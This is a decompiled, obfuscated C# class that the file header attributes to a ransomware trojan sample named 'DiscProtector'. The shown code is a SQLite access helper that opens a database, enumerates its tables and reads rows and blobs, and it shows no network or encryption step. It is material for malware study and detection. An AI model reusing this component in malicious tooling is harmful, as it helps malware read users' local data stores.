// Decompiled with JetBrains decompiler
// Type: aubvMzmN971Y54JdQ5.UUuLQMuomT60
// Assembly: DiscProtector, Version=3.6.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F40A7262-BF76-4E46-8F6B-C1EE3000D2ED
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00018-msil\Trojan-Ransom.Win32.Foreign.nbpa-79fe48544e9d521d0bce3336f250f29b28730fef7c7d1a6617ce04fa67da6e53.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Data;
using System.Runtime.InteropServices;
using System.Text;

namespace aubvMzmN971Y54JdQ5
{
  public class UUuLQMuomT60
  {
    private const int SQL_OK = 0;
    private const int SQL_ROW = 100;
    private const int SQL_DONE = 101;
    private IntPtr hvO4PDdMyo183;

    public UUuLQMuomT60() => this.hvO4PDdMyo183 = IntPtr.Zero;

    public UUuLQMuomT60(string baseName) => this.aS7Yd04Mlb258(baseName);

    [DllImport("kernel32", EntryPoint = "HeapAlloc")]
    private static extern IntPtr wrgAtQxr4c239(IntPtr heap, uint flags, uint bytes);

    [DllImport("kernel32", EntryPoint = "GetProcessHeap")]
    private static extern IntPtr bHiw8WNqGO240();

    [DllImport("kernel32", EntryPoint = "lstrlen")]
    private static extern int bPhJYlgjzm241(IntPtr str);

    [DllImport("sqlite3", EntryPoint = "sqlite3_open")]
    private static extern int w7BZacOyqo242(IntPtr fileName, out IntPtr database);

    [DllImport("sqlite3", EntryPoint = "sqlite3_close")]
    private static extern int IJwNudBYDU243(IntPtr database);

    [DllImport("sqlite3", EntryPoint = "sqlite3_exec")]
    private static extern int Y3IxHH9wB8244(
      IntPtr database,
      IntPtr query,
      IntPtr callback,
      IntPtr arguments,
      out IntPtr errorr);

    [DllImport("sqlite3", EntryPoint = "sqlite3_errmsg")]
    private static extern IntPtr zdSHG35jlV245(IntPtr database);

    [DllImport("sqlite3", EntryPoint = "sqlite3_prepare_v2")]
    private static extern int \u0038eZi6rjtfL246(
      IntPtr database,
      IntPtr query,
      int length,
      out IntPtr statement,
      out IntPtr tail);

    [DllImport("sqlite3", EntryPoint = "sqlite3_step")]
    private static extern int JhGEosp3ht247(IntPtr statement);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_count")]
    private static extern int \u0033hXiOuRP7q248(IntPtr statement);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_name")]
    private static extern IntPtr \u0037iDILJ4prg249(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_type")]
    private static extern int oFhPohxdjd250(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_int")]
    private static extern int E11RRQhGuC251(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_double")]
    private static extern double AtmPDqEYTF252(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_text")]
    private static extern IntPtr oZC15n07Uw253(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_blob")]
    private static extern IntPtr WDwUL6gLQV254(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_bytes")]
    private static extern IntPtr soVPFUjscX255(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_table_name")]
    private static extern IntPtr DzkDPEp0Mu256(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_finalize")]
    private static extern int P9MXFXXs3x257(IntPtr handle);

    public void aS7Yd04Mlb258(string baseName)
    {
      if (UUuLQMuomT60.w7BZacOyqo242(this.UWrgx4BoWN265(baseName), out this.hvO4PDdMyo183) != 0)
      {
        this.hvO4PDdMyo183 = IntPtr.Zero;
        throw new Exception("Error with opening database " + baseName + "!");
      }
    }

    public void \u0034yVWTmiS57259()
    {
      if (!(this.hvO4PDdMyo183 != IntPtr.Zero))
        return;
      UUuLQMuomT60.IJwNudBYDU243(this.hvO4PDdMyo183);
    }

    public ArrayList GgZm5iBX9I260()
    {
      DataTable dataTable = this.zCEApheQ4j262("SELECT name FROM sqlite_master WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'UNION ALL SELECT name FROM sqlite_temp_master WHERE type IN ('table','view') ORDER BY 1");
      ArrayList arrayList = new ArrayList();
      try
      {
        foreach (DataRow row in dataTable.Rows)
          arrayList.Add((object) row.ItemArray[0].ToString());
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      return arrayList;
    }

    public void WRpENKsmqO261(string query)
    {
      IntPtr errorr;
      UUuLQMuomT60.Y3IxHH9wB8244(this.hvO4PDdMyo183, this.UWrgx4BoWN265(query), IntPtr.Zero, IntPtr.Zero, out errorr);
      if (errorr != IntPtr.Zero)
        throw new Exception("Error with executing non-query: \"" + query + "\"!\n" + this.\u0034LTQ4QutOU266(UUuLQMuomT60.zdSHG35jlV245(errorr)));
    }

    public DataTable zCEApheQ4j262(string query)
    {
      IntPtr statement;
      UUuLQMuomT60.\u0038eZi6rjtfL246(this.hvO4PDdMyo183, this.UWrgx4BoWN265(query), this.\u0037XHWoHE6oM268(this.UWrgx4BoWN265(query)), out statement, out IntPtr _);
      DataTable table = new DataTable();
      int num = this.E5mVQTTLSU263(statement, ref table);
      while (num == 100)
        num = this.o6DDfd9g88264(statement, ref table);
      UUuLQMuomT60.P9MXFXXs3x257(statement);
      return table;
    }

    private int E5mVQTTLSU263(IntPtr statement, ref DataTable table)
    {
      table = new DataTable("resultTable");
      if (UUuLQMuomT60.JhGEosp3ht247(statement) == 100)
      {
        int num1 = UUuLQMuomT60.\u0033hXiOuRP7q248(statement);
        object[] objArray = new object[checked (num1 - 1 + 1)];
        int num2 = checked (num1 - 1);
        int columnNumber = 0;
        while (columnNumber <= num2)
        {
          string columnName = this.\u0034LTQ4QutOU266(UUuLQMuomT60.\u0037iDILJ4prg249(statement, columnNumber));
          int num3 = UUuLQMuomT60.oFhPohxdjd250(statement, columnNumber);
          if (num3 == Conversion.Fix(1))
          {
            table.Columns.Add(columnName, Type.GetType("System.Int32"));
            objArray[columnNumber] = (object) UUuLQMuomT60.E11RRQhGuC251(statement, columnNumber);
          }
          else if (num3 == Conversion.Fix(2))
          {
            table.Columns.Add(columnName, Type.GetType("System.Single"));
            objArray[columnNumber] = (object) UUuLQMuomT60.AtmPDqEYTF252(statement, columnNumber);
          }
          else if (num3 == Conversion.Fix(3))
          {
            table.Columns.Add(columnName, Type.GetType("System.String"));
            objArray[columnNumber] = (object) this.\u0034LTQ4QutOU266(UUuLQMuomT60.oZC15n07Uw253(statement, columnNumber));
          }
          else if (num3 == Conversion.Fix(4))
          {
            table.Columns.Add(columnName, Type.GetType("System.Array"));
            int siz = (int) UUuLQMuomT60.soVPFUjscX255(statement, columnNumber);
            objArray[columnNumber] = (object) this.RGtwptY1lc267(UUuLQMuomT60.WDwUL6gLQV254(statement, columnNumber), siz);
          }
          else
          {
            table.Columns.Add(columnName, Type.GetType("System.String"));
            objArray[columnNumber] = (object) "";
          }
          checked { ++columnNumber; }
        }
        table.Rows.Add(objArray);
      }
      return UUuLQMuomT60.JhGEosp3ht247(statement);
    }

    private int o6DDfd9g88264(IntPtr statement, ref DataTable table)
    {
      int num1;
      try
      {
        int num2 = UUuLQMuomT60.\u0033hXiOuRP7q248(statement);
        object[] objArray = new object[checked (num2 - 1 + 1)];
        int num3 = checked (num2 - 1);
        int columnNumber = 0;
        while (columnNumber <= num3)
        {
          int num4 = UUuLQMuomT60.oFhPohxdjd250(statement, columnNumber);
          if (num4 == Conversion.Fix(1))
            objArray[columnNumber] = (object) UUuLQMuomT60.E11RRQhGuC251(statement, columnNumber);
          else if (num4 == Conversion.Fix(2))
            objArray[columnNumber] = (object) UUuLQMuomT60.AtmPDqEYTF252(statement, columnNumber);
          else if (num4 == Conversion.Fix(3))
            objArray[columnNumber] = (object) this.\u0034LTQ4QutOU266(UUuLQMuomT60.oZC15n07Uw253(statement, columnNumber));
          else if (num4 == Conversion.Fix(4))
          {
            int siz = (int) UUuLQMuomT60.soVPFUjscX255(statement, columnNumber);
            objArray[columnNumber] = (object) this.RGtwptY1lc267(UUuLQMuomT60.WDwUL6gLQV254(statement, columnNumber), siz);
          }
          else
            objArray[columnNumber] = (object) "";
          checked { ++columnNumber; }
        }
        table.Rows.Add(objArray);
        num1 = UUuLQMuomT60.JhGEosp3ht247(statement);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return num1;
    }

    private IntPtr UWrgx4BoWN265(string str)
    {
      if (str == null)
        return IntPtr.Zero;
      byte[] bytes1 = Encoding.UTF8.GetBytes(str);
      int bytes2 = checked (bytes1.Length + 1);
      IntPtr num = UUuLQMuomT60.wrgAtQxr4c239(UUuLQMuomT60.bHiw8WNqGO240(), 0U, checked ((uint) bytes2));
      Marshal.Copy(bytes1, 0, num, bytes1.Length);
      Marshal.WriteByte(num, bytes1.Length, (byte) 0);
      return num;
    }

    private string \u0034LTQ4QutOU266(IntPtr ptr)
    {
      if (ptr == IntPtr.Zero)
        return (string) null;
      Encoding utF8 = Encoding.UTF8;
      int num = this.\u0037XHWoHE6oM268(ptr);
      byte[] numArray = new byte[checked (num - 1 + 1)];
      Marshal.Copy(ptr, numArray, 0, num);
      return utF8.GetString(numArray, 0, num);
    }

    private Array RGtwptY1lc267(IntPtr ptr, int siz)
    {
      if (ptr == IntPtr.Zero)
        return (Array) null;
      Encoding utF8 = Encoding.UTF8;
      this.\u0037XHWoHE6oM268(ptr);
      byte[] destination = new byte[checked (siz - 1 + 1)];
      Marshal.Copy(ptr, destination, 0, siz);
      return (Array) destination;
    }

    private int \u0037XHWoHE6oM268(IntPtr ptr) => ptr == IntPtr.Zero ? 0 : UUuLQMuomT60.bPhJYlgjzm241(ptr);

    public enum IGsegdsVQ461
    {
      INT = 1,
      FLOAT = 2,
      TEXT = 3,
      BLOB = 4,
      NULL = 5,
    }
  }
}
